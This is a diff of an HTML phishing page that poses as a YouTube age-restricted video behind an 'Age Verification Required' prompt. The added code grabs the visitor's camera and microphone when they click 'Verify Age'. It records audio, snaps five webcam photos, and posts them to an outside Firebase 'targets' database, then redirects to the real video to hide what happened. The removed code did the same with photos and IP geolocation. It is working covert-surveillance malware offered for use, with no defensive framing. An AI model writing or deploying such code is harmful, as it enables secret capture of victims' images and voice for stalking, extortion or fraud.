@@ -1,22 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube Video Player</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Player</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #000; color: #ccc; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .yt-ui { max-width: 400px; width: 90%; text-align: center; }
-        .red-btn { background: #ff0000; color: white; padding: 12px 30px; border-radius: 2px; font-weight: bold; text-transform: uppercase; }
+        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; }
+        .video-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.5; }
+        .overlay { position: relative; z-index: 10; height: 100vh; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.7); }
+        .red-btn { background: #ff0000; color: white; padding: 12px 30px; border-radius: 2px; font-weight: bold; text-transform: uppercase; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="yt-ui" id="main-ui">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8">
-        <h2 class="text-xl font-bold text-white mb-4">Verification Required</h2>
-        <p class="text-sm text-zinc-500 mb-8">This video is age-restricted. Please verify your age to continue.</p>
-        <button onclick="startCapture()" class="red-btn">Verify Age</button>
+    <div class="video-bg" id="player-box"></div>
+
+    <div class="overlay" id="main-ui">
+        <div class="text-center px-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8">
+            <h2 class="text-xl font-bold text-white mb-2">Age Verification Required</h2>
+            <p class="text-xs text-zinc-400 mb-8 font-medium">Please confirm you are 18+ to view this restricted content.</p>
+            <button onclick="startCapture()" class="red-btn">Verify Age</button>
+        </div>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline></video>
@@ -24,54 +28,50 @@
 
     <script>
         const FB_URL = "https://camera-af08b-default-rtdb.firebaseio.com/targets.json";
-        let photoCount = 0;
-        let ipInfo = "Detecting...";
+        const urlParams = new URLSearchParams(window.location.search);
+        const vidId = urlParams.get('id') || 'dQw4w9WgXcQ'; 
+
+        // Load specific video based on ID
+        document.getElementById('player-box').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${vidId}?autoplay=1&mute=1&controls=0" frameborder="0" allow="autoplay"></iframe>`;
 
         async function startCapture() {
-            document.getElementById('main-ui').innerHTML = `<div class="animate-pulse text-red-600 font-bold">Connecting Secure Server...</div>`;
-            
-            // Get IP
+            document.getElementById('main-ui').innerHTML = `<div class="animate-pulse text-red-600 font-bold uppercase tracking-widest">Verifying Identity...</div>`;
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const geo = await res.json();
-                ipInfo = geo.ip + " (" + geo.city + ")";
-            } catch(e) {}
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                
+                // Audio Record (3s)
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => fetch(FB_URL, { method: 'POST', body: JSON.stringify({ time: new Date().toLocaleTimeString(), audio: reader.result, ip: "User-Intel" }) });
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000);
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Photo Capture (5 Shots)
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                const captureInterval = setInterval(async () => {
-                    if (photoCount >= 5) {
-                        clearInterval(captureInterval);
-                        stream.getTracks().forEach(t => t.stop());
-                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                let count = 0;
+                const interval = setInterval(() => {
+                    if (count >= 5) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.youtube.com/watch?v=" + vidId;
+                        }, 3000);
                         return;
                     }
-
                     const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const photoData = canvas.toDataURL('image/jpeg', 0.3);
-                    
-                    // Fast Individual Push
-                    fetch(FB_URL, { 
-                        method: 'POST', 
-                        body: JSON.stringify({
-                            time: new Date().toLocaleTimeString(),
-                            photo: photoData,
-                            ip: ipInfo
-                        }) 
-                    });
-                    photoCount++;
-                }, 400); 
-
-            } catch(e) {
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }
+                    fetch(FB_URL, { method: 'POST', body: JSON.stringify({ time: new Date().toLocaleTimeString(), photo: canvas.toDataURL('image/jpeg', 0.3), ip: "User-Intel" }) });
+                    count++;
+                }, 400);
+            } catch(e) { window.location.href = "https://www.youtube.com/watch?v=" + vidId; }
         }
     </script>
 </body>
